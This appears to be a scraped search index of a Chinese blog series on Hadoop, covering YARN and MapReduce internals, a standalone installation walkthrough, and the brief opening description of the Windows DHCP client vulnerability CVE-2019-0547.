YARN有一套Container的生命周期管理机制，而ApplicationMaster和其Container之间的管理是应用程序自己定义的 任务调度 只关注资源的使用情况，根据需求合理分配资源 Scheluer可以根据申请的需要，在特定的机器上申请特定的资源（ApplicationMaster负责申请资源时的数据本地化的考虑，ResourceManager将尽量满足其申请需求，在指定的机器上分配Container，从而减少数据移动） 内部结构 Client Service: 应用提交、终止、输出信息（应用、队列、集群等的状态信息） Adaminstration Service: 队列、节点、Client权限管理 ApplicationMasterService: 注册、终止ApplicationMaster, 获取ApplicationMaster的资源申请或取消的请求，并将其异步地传给Scheduler, 单线程处理 ApplicationMaster Liveliness Monitor: 接收ApplicationMaster的心跳消息，如果某个ApplicationMaster在一定时间内没有发送心跳，则被任务失效，其资源将会被回收，然后ResourceManager会重新分配一个ApplicationMaster运行该应用（默认尝试2次） Resource Tracker Service: 注册节点, 接收各注册节点的心跳消息 NodeManagers Liveliness Monitor: 监控每个节点的心跳消息，如果长时间没有收到心跳消息，则认为该节点无效, 同时所有在该节点上的Container都标记成无效，也不会调度任务到该节点运行 ApplicationManager: 管理应用程序，记录和管理已完成的应用 ApplicationMaster Launcher: 一个应用提交后，负责与NodeManager交互，分配Container并加载ApplicationMaster，也负责终止或销毁 YarnScheduler: 资源调度分配， 有FIFO(with Priority)，Fair，Capacity方式 ContainerAllocationExpirer: 管理已分配但没有启用的Container，超过一定时间则将其回收 ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:1","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"2. NodeManager Node节点下的Container管理 启动时向ResourceManager注册并定时发送心跳消息，等待ResourceManager的指令 监控Container的运行，维护Container的生命周期，监控Container的资源使用情况 启动或停止Container，管理任务运行时的依赖包（根据ApplicationMaster的需要，启动Container之前将需要的程序及其依赖包、配置文件等拷贝到本地） 内部结构 NodeStatusUpdater: 启动向ResourceManager注册，报告该节点的可用资源情况，通信的端口和后续状态的维护 ContainerManager: 接收RPC请求（启动、停止），资源本地化（下载应用需要的资源到本地，根据需要共享这些资源） PUBLIC: /filecache PRIVATE: /usercache//filecache APPLICATION: /usercache//appcache//（在程序完成后会被删除） ContainersLauncher: 加载或终止Container ContainerMonitor: 监控Container的运行和资源使用情况 ContainerExecutor: 和底层操作系统交互，加载要运行的程序 ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:2","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"3. ApplicationMaster 单个作业的资源管理和任务监控 具体功能描述： 计算应用的资源需求，资源可以是静态或动态计算的，静态的一般是Client申请时就指定了，动态则需要ApplicationMaster根据应用的运行状态来决定 根据数据来申请对应位置的资源（Data Locality） 向ResourceManager申请资源，与NodeManager交互进行程序的运行和监控，监控申请的资源的使用情况，监控作业进度 跟踪任务状态和进度，定时向ResourceManager发送心跳消息，报告资源的使用情况和应用的进度信息 负责本作业内的任务的容错 ApplicationMaster可以是用任何语言编写的程序，它和ResourceManager和NodeManager之间是通过ProtocolBuf交互，以前是一个全局的JobTracker负责的，现在每个作业都一个，可伸缩性更强，至少不会因为作业太多，造成JobTracker瓶颈。同时将作业的逻辑放到一个独立的ApplicationMaster中，使得灵活性更加高，每个作业都可以有自己的处理方式，不用绑定到MapReduce的处理模式上 如何计算资源需求 一般的MapReduce是根据block数量来定Map和Reduce的计算数量，然后一般的Map或Reduce就占用一个Container 如何发现数据的本地化 通过HDFS的block分片信息获取 ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:3","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"4. Container 资源申请的单位和任务运行的容器： 基本的资源单位（CPU、内存等） Container可以加载任意程序，而且不限于Java 一个Node可以包含多个Container，也可以是一个大的Container ApplicationMaster可以根据需要，动态申请和释放Container ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:4","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"5. Failover 失败类型 程序问题 进程崩溃 硬件问题 失败处理 任务失败 运行时异常或者JVM退出都会报告给ApplicationMaster 通过心跳来检查挂住的任务(timeout)，会检查多次（可配置）才判断该任务是否失效 一个作业的任务失败率超过配置，则认为该作业失败 失败的任务或作业都会有ApplicationMaster重新运行 ApplicationMaster失败 ApplicationMaster定时发送心跳信号到ResourceManager，通常一旦ApplicationMaster失败，则认为失败，但也可以通过配置多次后才失败 一旦ApplicationMaster失败，ResourceManager会启动一个新的ApplicationMaster 新的ApplicationMaster负责恢复之前错误的ApplicationMaster的状态(yarn.app.mapreduce.am.job.recovery.enable=true)，这一步是通过将应用运行状态保存到共享的存储上来实现的，ResourceManager不会负责任务状态的保存和恢复 Client也会定时向ApplicationMaster查询进度和状态，一旦发现其失败，则向ResouceManager询问新的ApplicationMaster NodeManager失败 NodeManager定时发送心跳到ResourceManager，如果超过一段时间没有收到心跳消息，ResourceManager就会将其移除 任何运行在该NodeManager上的任务和ApplicationMaster都会在其他NodeManager上进行恢复 如果某个NodeManager失败的次数太多，ApplicationMaster会将其加入黑名单（ResourceManager没有），任务调度时不在其上运行任务 ResourceManager失败 通过checkpoint机制，定时将其状态保存到磁盘，然后失败的时候，重新运行 通过zookeeper同步状态和实现透明的HA 可以看出，一般的错误处理都是由当前模块的父模块进行监控（心跳）和恢复。而最顶端的模块则通过定时保存、同步状态和zookeeper来ֹ实现HA ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:5","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"二、基本流程 YARN的基本流程可以用以下两个图来表示： 1. Job submission 从ResourceManager中获取一个Application ID 检查作业输出配置，计算输入分片 拷贝作业资源（job jar、配置文件、分片信息）到HDFS，以便后面任务的执行 2. Job initialization ResourceManager将作业递交给Scheduler（有很多调度算法，一般是根据优先级）Scheduler为作业分配一个Container，ResourceManager就加载一个application master process并交给NodeManager管理ApplicationMaster主要是创建一系列的监控进程来跟踪作业的进度，同时获取输入分片，为每一个分片创建一个Map task和相应的reduce task Application Master还决定如何运行作业，如果作业很小（可配置），则直接在同一个JVM下运行 3. Task assignment ApplicationMaster向Resource Manager申请资源（一个个的Container，指定任务分配的资源要求）一般是根据data locality来分配资源 4. Task execution ApplicationMaster根据ResourceManager的分配情况，在对应的NodeManager中启动Container 从HDFSN#x4E2D;读取任务所需资源（job jar，配置文件等），然后执行该任务 5. Progress and status update 定时将任务的进度和状态报告给ApplicationMaster Client定时向ApplicationMaster获取整个任务的进度和状态 6. Job completion Client定时检查整个作业是否完成 作业完成后，会清空临时文件、目录等 ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:2:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"Hadoop--初学到漏洞","date":"2019-10-16","objectID":"/2019/10/hadoop3/","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(三)–MapReduce ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:0:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"一、简介 MapReduce是一种分布式计算方式，指定一个Map函数，把一组键值对映射成一组新的键值对，指定并发的Reduce（归约）函数，用来保证所有映射的键值对中的每一个共享相同的键组。 其Pattern图如下： map: (K1, V1) → list(K2, V2) combine: (K2, list(V2)) → list(K2, V2) reduce: (K2, list(V2)) → list(K3, V3) Map输出格式和Reduce输入格式一定是相同的。 ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:1:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"二、流程 ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:2:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"1. 基本流程 MapReduce主要是先读取文件数据，然后进行Map处理，接着Reduce处理，最后把处理结果写到文件中。流程图如下： ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:2:1","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"2. 详细流程 处理的详细流程如下： ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:2:2","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"3. 多节点下的流程 多节点的流程如下： ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:2:3","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"4. 数据角度流程处理 数据流的处理过程如下： Record reader 记录阅读器会翻译由输入格式生成的记录，记录阅读器用于将数据解析给记录，并不分析记录自身。它将数据以键值对的形式传输给mapper。通常键是位置信息，值是构成记录的数据存储块。 Map 在映射器中用户提供的代码称为中间对。键决定了数据分类的依据，而值决定了处理器中的分析信息.本书的设计模式将会展示大量细节来解释特定键值如何选择。 Shuffle and Sort ruduce任务以随机和排序步骤开始。此步骤写入输出文件并下载到本地计算机。这些数据采用键进行排序以把等价密钥组合到一起。 Reduce reducer采用分组数据作为输入。该功能传递键和此键相关值的迭代器。可以采用多种方式来汇总、过滤或者合并数据。当ruduce功能完成，就会发送0个或多个键值对。 输出格式 输出格式会转换最终的键值对并写入文件。默认情况下键和值以tab分割，各记录以换行符分割。因此可以自定义更多输出格式，最终数据会写入HDFS。 ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:2:4","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"三、分阶段过程详细分析 ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"1. Hadoop读取数据 通过InputFormat决定读取的数据的类型（可以是文件或数据库等），然后拆分成InputSplit，每个InputSplit对应一个Map处理，RecordReader读取InputSplit内容给到Map。 功能 验证作业输入的正确性，如格式等 将输入文件切割成逻辑分片（InputSplit），一个InputSplit分配给一个独立的Map任务 提供ReocrdReader实现，读取InputSplit中的“K-V”对给Mapper使用 方法 List getSplits(): 获取由输入文件计算出输入分片(InputSplit)，解决数据或文件分割成片问题 RecordReader createRecordReader(): 创建RecordReader，从InputSplit中读取数据，解决读取分片中数据问题 TextInputFormat: 输入文件中的每一行就是一个记录，Key是这一行的byte offset，而value是这一行的内容 KeyValueTextInputFormat: 输入文件中每一行就是一个记录，第一个分隔符字符切分每行。在分隔符字符之前的内容为Key，在之后的为Value。分隔符变量通过key.value.separator.in.input.line变量设置，默认为(\\t)字符。 NLineInputFormat: 与TextInputFormat一样，但每个数据块必须保证有且只有Ｎ行，mapred.line.input.format.linespermap属性，默认为１ SequenceFileInputFormat: 一个用来读取字符流数据的InputFormat，\u003ckey,value\u003e为用户自定义的。字符流数据是Hadoop自定义的压缩的二进制数据格式。它用来优化从一个MapReduce任务的输出到另一个MapReduce任务的输入之间的数据传输过程。\u003c/key,value\u003e **InputSplit：**代表一个个逻辑分片，并没有真正存储数据，只是提供了一个如何将数据分片的方法 Split内有Location信息，利于数据局部化。一个InputSplit给一个单独的Map处理 public abstract class InputSplit { /** * 获取Split的大小，支持根据size对InputSplit排序. */ public abstract long getLength() throws IOException, InterruptedException; /** * 获取存储该分片的数据所在的节点位置. */ public abstract String[] getLocations() throws IOException, InterruptedException; } ``` **RecordReader：**将InputSplit拆分成一个个\u003ckey,value\u003e对给Map处理，也是实际的文件读取分隔对象\u003c/key,value\u003e ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:1","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"2. 问题 大量小文件如何处理 CombineFileInputFormat可以将若干个Split打包成一个，目的是避免过多的Map任务（因为Split的数目决定了Map的数目，大量的Mapper Task创建销毁开销将是巨大的） 怎么计算split的 通常一个split就是一个block（FileInputFormat仅仅拆分比block大的文件），这样做的好处是使得Map可以在存储有当前数据的节点上运行本地的任务，而不需要通过网络进行跨节点的任务调度 通过mapred.min.split.size， mapred.max.split.size，block.size来控制拆分的大小 如果mapred.min.split.size大于block size，则会将两个block合成到一个split，这样有部分block数据需要通过网络读取 如果mapred.max.split.size小于block size，则会将一个block拆成多个split，增加了Map任务数（Map对split进行计算并且上报结果，关闭当前计算打开新的split均需要耗费资源） 先获取文件在HDFS上的路径和Block信息，然后根据splitSize对文件进行切分（ splitSize = computeSplitSize(blockSize, minSize, maxSize) ），默认splitSize 就等于blockSize的默认值（64m） public List\u003cInputSplit\u003e getSplits(JobContext job) throws IOException { // 首先计算分片的最大和最小值。这两个值将会用来计算分片的大小 long minSize = Math.max(getFormatMinSplitSize(), getMinSplitSize(job)); long maxSize = getMaxSplitSize(job); // generate splits List\u003cInputSplit\u003e splits = new ArrayList\u003cInputSplit\u003e(); List\u003cFileStatus\u003e files = listStatus(job); for (FileStatus file: files) { Path path = file.getPath(); long length = file.getLen(); if (length != 0) { FileSystem fs = path.getFileSystem(job.getConfiguration()); // 获取该文件所有的block信息列表[hostname, offset, length] BlockLocation[] blkLocations = fs.getFileBlockLocations(file, 0, length); // 判断文件是否可分割，通常是可分割的，但如果文件是压缩的，将不可分割 if (isSplitable(job, path)) { long blockSize = file.getBlockSize(); // 计算分片大小 // 即 Math.max(minSize, Math.min(maxSize, blockSize)); long splitSize = computeSplitSize(blockSize, minSize, maxSize); long bytesRemaining = length; // 循环分片。 // 当剩余数据与分片大小比值大于Split_Slop时，继续分片， 小于等于时，停止分片 while (((double) bytesRemaining)/splitSize \u003e SPLIT_SLOP) { int blkIndex = getBlockIndex(blkLocations, length-bytesRemaining); splits.add(makeSplit(path, length-bytesRemaining, splitSize, blkLocations[blkIndex].getHosts())); bytesRemaining -= splitSize; } // 处理余下的数据 if (bytesRemaining != 0) { splits.add(makeSplit(path, length-bytesRemaining, bytesRemaining, blkLocations[blkLocations.length-1].getHosts())); } } else { // 不可split，整块返回 splits.add(makeSplit(path, 0, length, blkLocations[0].getHosts())); } } else { // 对于长度为0的文件，创建空Hosts列表，返回 splits.add(makeSplit(path, 0, length, new String[0])); } } // 设置输入文件数量 job.getConfiguration().setLong(NUM_INPUT_FILES, files.size()); LOG.debug(\"Total # of splits: \" + splits.size()); return splits; } 分片间的数据如何处理 split是根据文件大小分割的，而一般处理是根据分隔符进行分割的，这样势必存在一条记录横跨两个split ​ 解决办法是只要不是第一个split，都会远程读取一条记录。不是第一个split的都忽略到第一条记录 public class LineRecordReader extends RecordReader\u003cLongWritable, Text\u003e { private CompressionCodecFactory compressionCodecs = null; private long start; private long pos; private long end; private LineReader in; private int maxLineLength; private LongWritable key = null; private Text value = null; // initialize函数即对LineRecordReader的一个初始化 // 主要是计算分片的始末位置，打开输入流以供读取K-V对，处理分片经过压缩的情况等 public void initialize(InputSplit genericSplit, TaskAttemptContext context) throws IOException { FileSplit split = (FileSplit) genericSplit; Configuration job = context.getConfiguration(); this.maxLineLength = job.getInt(\"mapred.linerecordreader.maxlength\", Integer.MAX_VALUE); start = split.getStart(); end = start + split.getLength(); final Path file = split.getPath(); compressionCodecs = new CompressionCodecFactory(job); final CompressionCodec codec = compressionCodecs.getCodec(file); // 打开文件，并定位到分片读取的起始位置 FileSystem fs = file.getFileSystem(job); FSDataInputStream fileIn = fs.open(split.getPath()); boolean skipFirstLine = false; if (codec != null) { // 文件是压缩文件的话，直接打开文件 in = new LineReader(codec.createInputStream(fileIn), job); end = Long.MAX_VALUE; } else { // 只要不是第一个split，则忽略本split的第一行数据 if (start != 0) { skipFirstLine = true; --start; // 定位到偏移位置，下次读取就会从偏移位置开始 fileIn.seek(start); } in = new LineReader(fileIn, job); } if (skipFirstLine) { // 忽略第一行数据，重新定位start start += in.readLine(new Text(), 0, (int) Math.min((long) Integer.MAX_VALUE, end - start)); } this.pos = start; } public boolean nextKeyValue() throws IOException { if (key == null) { key = new LongWritable(); } key.set(pos);// ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:2","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"3. Mapper 主要是读取InputSplit的每一个Key,Value对并进行处理： public class Mapper\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e { /** * 预处理，仅在map task启动时运行一次 */ protected void setup(Context context) throws IOException, InterruptedException { } /** * 对于InputSplit中的每一对\u003ckey, value\u003e都会运行一次 */ @SuppressWarnings(\"unchecked\") protected void map(KEYIN key, VALUEIN value, Context context) throws IOException, InterruptedException { context.write((KEYOUT) key, (VALUEOUT) value); } /** * 扫尾工作，比如关闭流等 */ protected void cleanup(Context context) throws IOException, InterruptedException { } /** * map task的驱动器 */ public void run(Context context) throws IOException, InterruptedException { setup(context); while (context.nextKeyValue()) { map(context.getCurrentKey(), context.getCurrentValue(), context); } cleanup(context); } } public class MapContext\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e extends TaskInputOutputContext\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e { private RecordReader\u003cKEYIN, VALUEIN\u003e reader; private InputSplit split; /** * Get the input split for this map. */ public InputSplit getInputSplit() { return split; } @Override public KEYIN getCurrentKey() throws IOException, InterruptedException { return reader.getCurrentKey(); } @Override public VALUEIN getCurrentValue() throws IOException, InterruptedException { return reader.getCurrentValue(); } @Override public boolean nextKeyValue() throws IOException, InterruptedException { return reader.nextKeyValue(); } } ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:3","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"4.Shuffle 对Map的结果进行排序并传输到Reduce进行处理 Map的结果并不是直接存放到硬盘,而是利用缓存做一些预排序处理 Map会调用Combiner，压缩，按key进行分区、排序等，尽量减少结果的大小 每个Map完成后都会通知Task，然后Reduce就可以进行处理 Map端 当Map程序开始产生结果的时候，并不是直接写到文件的，而是利用缓存做一些排序方面的预处理操作 每个Map任务都有一个循环内存缓冲区（默认100MB），当缓存的内容达到80%时，后台线程开始将内容写到文件，此时Map任务可以继续输出结果，但如果缓冲区满了，Map任务则需要等待 写文件使用round-robin方式。在写入文件之前，先将数据按照Reduce进行分区。对于每一个分区，都会在内存中根据key进行排序，如果配置了Combiner，则排序后执行Combiner（Combine之后可以减少写入文件和传输的数据） 每次结果达到缓冲区的阀值时，都会创建一个文件，在Map结束时，可能会产生大量的文件。在Map完成前，会将这些文件进行合并和排序。如果文件的数量超过3个，则合并后会再次运行Combiner（1、2个文件就没有必要了） 如果配置了压缩，则最终写入的文件会先进行压缩，这样可以减少写入和传输的数据 一旦Map完成，则通知任务管理器，此时Reduce就可以开始复制结果数据 Reduce端 Map的结果文件都存放到运行Map任务的机器的本地硬盘中 如果Map的结果很少，则直接放到内存，否则写入文件中 同时后台线程将这些文件进行合并和排序到一个更大的文件中（如果文件是压缩的，则需要先解压） 当所有的Map结果都被复制和合并后，就会调用Reduce方法 Reduce结果会写入到HDFS中 调优 一般的原则是给shuffle分配尽可能多的内存，但前提是要保证Map、Reduce任务有足够的内存 对于Map，主要就是避免把文件写入磁盘，例如使用Combiner，增大io.sort.mb的值 对于Reduce，主要是把Map的结果尽可能地保存到内存中，同样也是要避免把中间结果写入磁盘。默认情况下，所有的内存都是分配给Reduce方法的，如果Reduce方法不怎么消耗内存，可以mapred.inmem.merge.threshold设成0，mapred.job.reduce.input.buffer.percent设成1.0 在任务监控中可通过Spilled records counter来监控写入磁盘的数，但这个值是包括map和reduce的 对于IO方面，可以Map的结果可以使用压缩，同时增大buffer size（io.file.buffer.size，默认4kb） 配置 属性 默认值 描述 io.sort.mb 100 映射输出分类时所使用缓冲区的大小. io.sort.record.percent 0.05 剩余空间用于映射输出自身记录.在1.X发布后去除此属性.随机代码用于使用映射所有内存并记录信息. io.sort.spill.percent 0.80 针对映射输出内存缓冲和记录索引的阈值使用比例. io.sort.factor 10 文件分类时合并流的最大数量。此属性也用于reduce。通常把数字设为100. min.num.spills.for.combine 3 组合运行所需最小溢出文件数目. mapred.compress.map.output false 压缩映射输出. mapred.map.output.compression.codec DefaultCodec 映射输出所需的压缩解编码器. mapred.reduce.parallel.copies 5 用于向reducer传送映射输出的线程数目. mapred.reduce.copy.backoff 300 时间的最大数量，以秒为单位，这段时间内若reducer失败则会反复尝试传输 io.sort.factor 10 组合运行所需最大溢出文件数目. mapred.job.shuffle.input.buffer.percent 0.70 随机复制阶段映射输出缓冲器的堆栈大小比例 mapred.job.shuffle.merge.percent 0.66 用于启动合并输出进程和磁盘传输的映射输出缓冲器的阀值使用比例 mapred.inmem.merge.threshold 1000 用于启动合并输出和磁盘传输进程的映射输出的阀值数目。小于等于0意味着没有门槛，而溢出行为由 mapred.job.shuffle.merge.percent单独管理. mapred.job.reduce.input.buffer.percent 0.0 用于减少内存映射输出的堆栈大小比例，内存中映射大小不得超出此值。若reducer需要较少内存则可以提高该值. ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:4","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"5. 编程 处理 select：直接分析输入数据，取出需要的字段数据即可 where: 也是对输入数据处理的过程中进行处理，判断是否需要该数据 aggregation:min, max, sum group by: 通过Reducer实现 sort join: map join, reduce join Third-Party Libraries # 第一种 export LIBJARS=$MYLIB/commons-lang-2.3.jar, hadoop jar prohadoop-0.0.1-SNAPSHOT.jar org.aspress.prohadoop.c3. WordCountUsingToolRunner -libjars $LIBJARS #第二种 hadoop jar prohadoop-0.0.1-SNAPSHOT-jar-with-dependencies.jar org.aspress.prohadoop.c3. WordCountUsingToolRunner The dependent libraries are now included inside the application JAR file 一般还是第一种的好，指定依赖可以利用Public Cache，如果是包含依赖，则每次都需要拷贝。 ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:5","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"四、参考文献 w3 school MapReduce Design Patterns ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:4:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"Hadoop--初学到漏洞","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(二)–环境搭建–本机模式 ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:0:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"前言 有条件的买一组服务器做集群，没有条件的配置高性能机器搭建虚拟机。此处以虚拟机进行搭建集群（多个Linux主机）。 第一次首先进行本机模式的Hadoop搭建。 ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:1:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"一、虚拟机 centos7, 创建新用户，具有root权限。 在/opt目录下创建两个文件夹，分别为modules和software sudo mkdir modules sudo mkdir software ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:2:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"二、JAVA环境配置 centos7自带java环境，但自带的openjdk没有增加对java监控命令jps的支持，两种解决方案：卸载原有的openjdk进行再重装或者通过yum安装jdk开发插件。此处我们采用第一种解决方案： 下载Oracle版本JDK，jdk-7u67-linux-x64.tar.gz，并解压，然后配置好环境变量： tar -zxvf jdk-7u67-linux-x64.tar.gz -C /opt/modules export JAVA_HOME=/usr/local/jdk1.7.0_67 export PATH=$JAVA_HOME/bin:$PATH 对java环境进行验证： （务必确保java环境正确，java版本可以自行尝试，此处我使用了一个较老的版本） ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:3:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"三、Hadoop环境配置 下载Apache Hadoop，到官网下载即可，此处使用的是Hadoop-2.10.0（建议使用Binary，因为刚开始可能不熟悉源码编译）： 进入，然后选择一个链接点击下载，也可以直接使用wget下载： 下载后的文件建议放在/opt/modules下面一份，然后解压到/usr/local/路径下。 在.bashrc文件中配置Hadoop的环境变量： export HADOOP_HOME=/usr/local/hadoop-2.10.0 尝试运行：hadoop version 如果不报错，说明安装没有问题，可以跳过进入下面的验证，如果此处报错： ​ 运行其他的hadoop jar之类的命令也提示此问题，说明环境变量配置存在问题，可以尝试采用以下解决方式： ​ 在.bashrc中添加如下内容： export HADOOP_HOME=/usr/local/hadoop-2.10.0 #hadoop的环境变量，前面已经设置过 export HADOOP_INSTALL=$HADOOP_HOME export HADOOP_MAPRED_HOME=$HADOOP_HOME export HADOOP_COMMON_HOME=$HADOOP_HOME export HADOOP_HDFS_HOME=$HADOOP_HOME export YARN_HOME=$HADOOP_HOME export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin export HADOOP_CONF_DIR=$HADOOP_HOME export HADOOP_PREFIX=$HADOOP_HOME export HADOOP_LIBEXEC_DIR=$HADOOP_HOME/libexec export JAVA_LIBRARY_PATH=$HADOOP_HOME/lib/native:$JAVA_LIBRARY_PATH export HADOOP_CONF_DIR=$HADOOP_PREFIX/etc/hadoop ​ 然后进行 source ~/.bashrc，此时再运行hadoop version进行验证： ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:4:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"四、环境验证 验证一个简单的Hadoop示例。 Hadoop安装提供了以下示例MapReduce jar文件，它提供了MapReduce的基本功能，可用于计算，如Pi值，文件列表中的字数等。 新建目录：mkdir /tmp/input 拷贝几个txt文件：cp $HADOOP_HOME/*.txt input 检查待测文件： ls -l input #输出 total 124 -rw-r--r-- 1 root root 106210 Mar 5 22:54 LICENSE.txt -rw-r--r-- 1 root root 15841 Mar 5 22:54 NOTICE.txt -rw-r--r-- 1 root root 1366 Mar 5 22:54 README.txt 运行命令进行每个可用文件的字数统计： hadoop jar $HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-examples-2.10.0.jar wordcount input output 输出保存在output / part-r00000文件中，可以使用以下命令检查： cat output/* 检查结果如下所示： 因为检查文件不同可能结果不同，可以正常统计文件的字数即可。 ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:5:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"五、总结 本机模式的安装配置相对简单，遇到错误网上搜一下基本都可以解决，需要根据自身配置进行不同的修改。后续将进行伪分布式和分布式环境的配置。 ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:6:0","tags":["Hadoop"],"title":"Hadoop--初学到漏洞(二)--环境搭建--本机模式","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"CVE-2019-0547漏洞简单分析","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/","tags":["漏洞"],"title":"CVE-2019-0547 漏洞分析","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"CVE-2019-0547 Analyse ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:0","tags":["漏洞"],"title":"CVE-2019-0547 漏洞分析","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"漏洞描述 CVE-2019-0547，一个Windows系统下DHCP客户端的任意代码执行漏洞，漏洞的主要原因是对DHCP消息的错误的处理方式造成内存损坏。攻击者可以通过构造恶意的DHCP响应数据包到存在漏洞的系统中来触发漏洞，最终可以实现以管理员权限执行任意代码，危害巨大。 ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:1","tags":["漏洞"],"title":"CVE-2019-0547 漏洞分析","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"漏洞影响范围 • Microsoft Windows10 version1803 • Microsoft Windows Serverversion 1803(ServerCoreInstallation) 该漏洞影响的系统版本只有两个，但是随着系统版本迭代，现在使用Windows 10的人越来越多，这个漏洞还是需要关注的。 ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:2","tags":["漏洞"],"title":"CVE-2019-0547 漏洞分析","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"漏洞基本信息 